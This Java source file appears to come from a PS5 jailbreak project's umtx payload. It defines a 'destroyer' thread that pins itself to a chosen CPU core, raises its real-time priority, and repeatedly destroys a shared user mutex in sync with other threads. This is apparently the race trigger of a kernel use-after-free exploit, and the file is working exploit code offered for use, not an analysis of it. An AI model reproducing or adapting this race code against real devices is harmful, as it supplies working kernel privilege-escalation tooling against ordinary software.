package org.ps5jb.client.payloads.umtx;

import org.ps5jb.loader.Status;
import org.ps5jb.sdk.core.SdkException;
import org.ps5jb.sdk.include.sys.CpuSet;
import org.ps5jb.sdk.include.sys.RtPrio;
import org.ps5jb.sdk.include.sys.Umtx;
import org.ps5jb.sdk.include.sys.errno.BadFileDescriptorException;
import org.ps5jb.sdk.include.sys.errno.InvalidValueException;
import org.ps5jb.sdk.include.sys.errno.NotFoundException;
import org.ps5jb.sdk.include.sys.errno.OutOfMemoryException;

public class DestroyerJob extends CommonJob {
    private final State state;
    private final int index;

    public DestroyerJob(int index, State state) {
        super();

        this.state = state;

        this.index = index;
        this.jobName = "destroyer#" + index;
    }

    protected void prepare() throws SdkException {
        super.prepare();

        // Move destroyer thread to separate core.
        CpuSet cpuSet = new CpuSet(this.libKernel);
        cpuSet.setCurrentThreadAffinity(this.state.DESTROYER_THREAD_CORES[index]);

        if (Config.toggleSetThreadPriorities) {
            // Set destroyer thread's priority, so it will run before lookup thread.
            RtPrio rtprio = new RtPrio(this.libKernel);
            rtprio.setRtPrio(0, Config.DESTROYER_THREAD_PRIORITY);
        }
    }

    protected void work() {
        final Umtx umtx = new Umtx(this.libKernel);
        while (!this.state.raceDoneFlag.get()) {
            DebugStatus.debug("Starting loop");

            DebugStatus.debug("Waiting for ready flag");
            while (!this.state.readyFlag.get()) {
                Thread.yield();
            }

            // Notify main thread that destroyer thread's loop is ready to start.
            this.state.numReadyThreads.incrementAndGet();

            DebugStatus.debug("Waiting for destroy flag");
            while (!this.state.destroyFlag.get()) {
                Thread.yield();
            }

            // Trigger destroying of primary user mutex and check for result.
            try {
                umtx.userMutexDestroy(this.state.primarySharedMemoryKeyAddress);

                // Notify that destroy was successful.
                this.state.numDestructions.incrementAndGet();
            } catch (NotFoundException e) {
                // Expected
            } catch (SdkException e) {
                DebugStatus.error("Performing destroy operation failed", e);
            }

            // Notify that destroyer thread done its main job.
            this.state.numCompletedThreads.incrementAndGet();

            DebugStatus.debug("Waiting for check done flag");
            while (!this.state.checkDoneFlag.get()) {
                Thread.yield();
            }

            // Notify main thread that destroyer thread is ready to finish.
            this.state.numReadyThreads.incrementAndGet();

            DebugStatus.debug("Waiting for done flag");
            while (!this.state.doneFlag.get()) {
                Thread.yield();
            }

            // Notify main thread that destroyer thread's loop was finished.
            this.state.numFinishedThreads.incrementAndGet();
        }

        // Racing done, waiting for others.

        DebugStatus.debug("Waiting for destroy flag");
        while (!this.state.destroyFlag.get()) {
            Thread.yield();
        }

        DebugStatus.debug("Finishing loop");
    }
}